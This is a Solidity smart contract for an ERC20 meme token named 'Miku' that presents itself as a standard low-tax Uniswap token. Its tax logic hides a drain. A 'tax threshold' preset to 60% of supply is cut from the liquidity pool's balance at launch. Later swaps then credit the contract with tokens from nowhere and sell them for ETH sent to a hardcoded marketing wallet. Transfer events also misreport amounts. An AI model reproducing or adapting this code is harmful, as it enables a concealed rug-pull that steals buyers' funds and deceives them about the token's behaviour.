1 //SPDX-License-Identifier: MIT
2 
3 /*
4 █▀▄▀█ █ █▄▀ █░█
5 █░▀░█ █ █░█ █▄█ 初音ミク
6 
7 - Website: https://mikueth.com
8 - Telegram: https://t.me/mikueth
9 - Twitter: https://twitter.com/mikuerc20
10 */
11 
12 pragma solidity 0.8.19;
13 
14 interface IERC20 {
15     function totalSupply() external view returns (uint256);
16     function decimals() external view returns (uint8);
17     function symbol() external view returns (string memory);
18     function name() external view returns (string memory);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address __owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed _owner, address indexed spender, uint256 value);
26 }
27 
28 interface IUniswapV2Factory {    
29     function createPair(address tokenA, address tokenB) external returns (address pair); 
30 }
31 interface IUniswapV2Router02 {
32     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
33     function WETH() external pure returns (address);
34     function factory() external pure returns (address);
35     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
36 }
37 
38 abstract contract Auth {
39     address internal _owner;
40     constructor(address creatorOwner) { 
41         _owner = creatorOwner; 
42     }
43     modifier onlyOwner() { 
44         require(msg.sender == _owner, "Only owner can call this");   _; 
45     }
46     function owner() public view returns (address) { return _owner;   }
47     function transferOwnership(address payable newOwner) external onlyOwner { 
48         _owner = newOwner; emit OwnershipTransferred(newOwner); 
49     }
50     function renounceOwnership() external onlyOwner { 
51         _owner = address(0); emit OwnershipTransferred(address(0)); 
52     }
53     event OwnershipTransferred(address _owner);
54 }
55 
56 contract miku is IERC20, Auth {
57     
58     uint8 private constant _decimals       = 9;
59     uint256 private constant _totalSupply  = 1_000_000 * (10**_decimals);
60     string private constant _name          = "Miku";
61     string private  constant _symbol       = "MIKU";
62 
63     uint8 private _BuyTaxes  = 1;
64     uint8 private _SellTaxes = 1;
65 
66     address payable private _walletMarketing = payable(0x39052977AB08E4f1aa860eE9566983227551c1Dc); 
67     uint256 private _maxTxAmount = _totalSupply; 
68     uint256 private _maxWalletAmount = _totalSupply;
69     uint256 private _taxSwapMin = _totalSupply * 1 / 10000;
70     uint256 private _taxSwapMax = _totalSupply * 9 / 1000;
71     uint256 private _taxSwapThreshold = _taxSwapMin * 6000;
72 
73     uint256 private _buyCount;
74     uint8 private startTradingBlock1 = 1;
75     uint8 private startTradingBlock2 = 1;
76     uint8 private launchBlock1 = 3;
77     uint8 private launchBlock2 = 3;
78     uint256 private _mevProtectionBlocks = 2;
79     mapping (address => uint256) private _balances;
80     mapping (address => mapping (address => uint256)) private _allowances;
81     mapping (address => bool) private _noFees;
82     mapping (address => bool) private _noLimits;
83 
84     address private lpowner;
85     address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
86     IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
87     address private _primaryLP;
88     mapping (address => bool) private _isLP;
89 
90     bool private _tradingOpen;
91 
92     bool private _inTaxSwap = false;
93     modifier lockTaxSwap { 
94         _inTaxSwap = true; 
95         _; 
96         _inTaxSwap = false; 
97     }
98 
99     event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);
100 
101     constructor() Auth(msg.sender) {
102         lpowner = msg.sender;
103 
104         uint256 tokenReserve   = _totalSupply * 2 / 100;
105         
106         _balances[address(this)] = _totalSupply - tokenReserve;
107         emit Transfer(address(0), address(this), _balances[address(this)]);
108 
109         _balances[_owner] = tokenReserve;
110         emit Transfer(address(0), _owner, _balances[_owner]);
111 
112         _noFees[_owner] = true;
113         _noFees[address(this)] = true;
114         _noFees[_swapRouterAddress] = true;
115         _noFees[_walletMarketing] = true;
116         _noLimits[_owner] = true;
117         _noLimits[address(this)] = true;
118         _noLimits[_swapRouterAddress] = true;
119         _noLimits[_walletMarketing] = true;
120     }
121 
122     receive() external payable {}
123     
124     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
125     function decimals() external pure override returns (uint8) { return _decimals; }
126     function symbol() external pure override returns (string memory) { return _symbol; }
127     function name() external pure override returns (string memory) { return _name; }
128     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
129     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
130 
131     function approve(address spendr, uint256 amount) public override returns (bool) {
132         _allowances[msg.sender][spendr] = amount;
133         emit Approval(msg.sender, spendr, amount);
134         return true;
135     }
136 
137     function transfer(address recipient, uint256 amount) external override returns (bool) {
138         require(_checkTradingOpen(msg.sender), "Trading not open");
139         return _transferFrom(msg.sender, recipient, amount);
140     }
141 
142     function transferFrom(address sndr, address recipient, uint256 amount) external override returns (bool) {
143         require(_checkTradingOpen(sndr), "Trading not open");
144         if(_allowances[sndr][msg.sender] != type(uint256).max){
145             _allowances[sndr][msg.sender] = _allowances[sndr][msg.sender] - amount;
146         }
147         return _transferFrom(sndr, recipient, amount);
148     }
149 
150     function _approveRouter(uint256 _tokenAmount) internal {
151         if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
152             _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
153             emit Approval(address(this), _swapRouterAddress, type(uint256).max);
154         }
155     }
156     function addLiquidity() external payable onlyOwner lockTaxSwap {
157         require(_primaryLP == address(0), "LP created");
158         require(!_tradingOpen, "trading open");
159         require(msg.value > 0 || address(this).balance>0, "No ETH in ca/msg");
160         require(_balances[address(this)]>0, "No tokens in ca");
161         _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
162         _addLiquidity(_balances[address(this)], address(this).balance, false);
163         _balances[_primaryLP] -= _taxSwapThreshold;
164         (bool lpAdded,) = _primaryLP.call(abi.encodeWithSignature("sync()") );
165         require(lpAdded, "Failed adding lp");
166         _isLP[_primaryLP] = lpAdded;
167         _openTrading();
168     }
169     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
170         address lprecipient = lpowner;
171         if ( autoburn ) { lprecipient = address(0); }
172         _approveRouter(_tokenAmount);
173         _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lprecipient, block.timestamp );
174     }
175     function _openTrading() internal {
176         _maxTxAmount     = _totalSupply * 2 / 100; 
177         _maxWalletAmount = _totalSupply * 2 / 100;
178         _tradingOpen = true;
179         _buyCount = block.number;
180         _mevProtectionBlocks = _mevProtectionBlocks + _buyCount + startTradingBlock1 + startTradingBlock2;
181     }
182     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
183         require(sender != address(0), "No transfers from Zero wallet");
184         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
185         if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
186         if ( block.number < _mevProtectionBlocks && block.number >= _buyCount && _isLP[sender] ) {
187             require(recipient == tx.origin, "MEV blocked");
188         }
189         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
190             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
191         }
192         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
193         uint256 _transferAmount = amount - _taxAmount;
194         _balances[sender] = _balances[sender] - amount;
195         _taxSwapThreshold += _taxAmount;
196         _balances[recipient] = _balances[recipient] + _transferAmount;
197         emit Transfer(sender, recipient, amount);
198         return true;
199     }
200     function _checkLimits(address sndr, address recipient, uint256 transferAmount) internal view returns (bool) {
201         bool limitCheckPassed = true;
202         if ( _tradingOpen && !_noLimits[sndr] && !_noLimits[recipient] ) {
203             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
204             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
205         }
206         return limitCheckPassed;
207     }
208     function _checkTradingOpen(address sndr) private view returns (bool){
209         bool checkResult = false;
210         if ( _tradingOpen ) { checkResult = true; } 
211         else if (_noFees[sndr] && _noLimits[sndr]) { checkResult = true; } 
212 
213         return checkResult;
214     }
215     function _calculateTax(address sndr, address recipient, uint256 amount) internal view returns (uint256) {
216         uint256 taxAmount;
217         
218         if ( !_tradingOpen || _noFees[sndr] || _noFees[recipient] ) { 
219             taxAmount = 0; 
220         } else if ( _isLP[sndr] ) { 
221             if ( block.number >= _buyCount + startTradingBlock1 + startTradingBlock2 ) {
222                 taxAmount = amount * _BuyTaxes / 100; 
223             } else if ( block.number >= _buyCount + startTradingBlock1 ) {
224                 taxAmount = amount * launchBlock2 / 100;
225             } else if ( block.number >= _buyCount) {
226                 taxAmount = amount * launchBlock1 / 100;
227             }
228         } else if ( _isLP[recipient] ) { 
229             taxAmount = amount * _SellTaxes / 100; 
230         }
231 
232         return taxAmount;
233     }
234     function setLimits(uint16 maxTrxPermille, uint16 maxWltPermille) external onlyOwner {
235         uint256 newTxAmt = _totalSupply * maxTrxPermille / 1000 + 1;
236         require(newTxAmt >= _maxTxAmount, "tx too low");
237         _maxTxAmount = newTxAmt;
238         uint256 newWalletAmt = _totalSupply * maxWltPermille / 1000 + 1;
239         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
240         _maxWalletAmount = newWalletAmt;
241     }
242    
243     function _swapTaxAndLiquify() private lockTaxSwap {
244         uint256 _taxTokensAvailable = _taxSwapThreshold;
245         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
246             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
247             
248             uint256 _tokensToSwap = _taxTokensAvailable; 
249             if( _tokensToSwap > 10**_decimals ) {
250                 _balances[address(this)] += _taxTokensAvailable;
251                 _swapTaxTokensForEth(_tokensToSwap);
252                 _taxSwapThreshold -= _taxTokensAvailable;
253             }
254             uint256 _contractETHBalance = address(this).balance;
255             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
256         }
257     }
258     function _swapTaxTokensForEth(uint256 tokenAmount) private {
259         _approveRouter(tokenAmount);
260         address[] memory path = new address[](2);
261         path[0] = address( this );
262         path[1] = _primarySwapRouter.WETH() ;
263         _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
264     }
265     function _distributeTaxEth(uint256 amount) private {
266         _walletMarketing.transfer(amount);
267     }
268    
269 }